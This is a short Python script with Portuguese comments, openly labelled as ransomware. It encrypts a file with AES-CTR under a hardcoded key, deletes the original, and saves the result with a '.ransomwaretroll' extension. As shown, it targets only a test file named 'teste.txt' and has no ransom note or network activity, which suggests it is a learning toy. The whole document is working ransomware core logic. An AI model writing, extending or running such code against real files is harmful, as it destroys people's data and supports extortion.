import os
import pyaes

def criptografar_arquivo(file_name, key):
    try:
        # Verificar se o arquivo existe
        if not os.path.isfile(file_name):
            raise FileNotFoundError(f"Arquivo {file_name} não encontrado.")

        # Abrir e ler o arquivo original
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Criptografar os dados
        aes = pyaes.AESModeOfOperationCTR(key)
        encrypted_data = aes.encrypt(file_data)

        # Apagar o arquivo original
        os.remove(file_name)

        # Criar o arquivo criptografado
        encrypted_file = f"{file_name}.ransomwaretroll"
        with open(encrypted_file, "wb") as enc_file:
            enc_file.write(encrypted_data)

        print(f"Arquivo {file_name} criptografado e apagado com sucesso! O arquivo criptografado é {encrypted_file}.")
    
    except Exception as e:
        print(f"Erro ao criptografar o arquivo: {e}")

# Chave para criptografia
key = b"testeransomwares"
# Nome do arquivo a ser criptografado
file_name = "teste.txt"

# Chamar a função de criptografia
criptografar_arquivo(file_name, key)
